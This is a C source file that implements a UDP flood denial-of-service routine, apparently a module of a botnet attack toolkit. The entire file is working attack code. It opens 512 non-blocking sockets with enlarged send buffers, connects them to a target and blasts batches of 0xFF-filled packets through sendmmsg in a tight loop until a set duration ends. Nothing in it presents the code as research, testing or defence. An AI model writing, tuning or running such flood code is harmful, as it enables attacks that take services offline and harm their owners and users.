#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

#include "udpplain_attack.h"
#include "../headers/protocol.h"

#define UDP_PLAIN_SOCKS 512
#define BATCH 64

void* udpplain_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    attack_option* opt_psize = find_option(params, OPT_PSIZE);
    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1400;
    if (psize == 0 || psize > 65507) psize = 1400;

    int sndbuf = 4 * 1024 * 1024;

    int fds[UDP_PLAIN_SOCKS];
    int active = 0;

    for (int i = 0; i < UDP_PLAIN_SOCKS; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fds[i] < 0) { fds[i] = -1; continue; }
        setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fds[i], F_SETFL, O_NONBLOCK);
        connect(fds[i], (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
        active++;
    }

    if (active == 0) return NULL;

    char *data = malloc(psize);
    if (!data) {
        for (int i = 0; i < UDP_PLAIN_SOCKS; i++)
            if (fds[i] != -1) close(fds[i]);
        return NULL;
    }
    memset(data, 0xFF, psize);

    /* Pre-build sendmmsg batch — connected sockets need no destination */
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];

    for (int i = 0; i < BATCH; i++) {
        iovs[i].iov_base = data;
        iovs[i].iov_len  = psize;
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov    = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        for (int i = 0; i < UDP_PLAIN_SOCKS; i++) {
            if (fds[i] == -1) continue;
            sendmmsg(fds[i], msgs, BATCH, MSG_NOSIGNAL);
        }
        /* check time every 4096 iterations to avoid syscall overhead */
        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
    }

    for (int i = 0; i < UDP_PLAIN_SOCKS; i++)
        if (fds[i] != -1) close(fds[i]);
    free(data);
    return NULL;
}
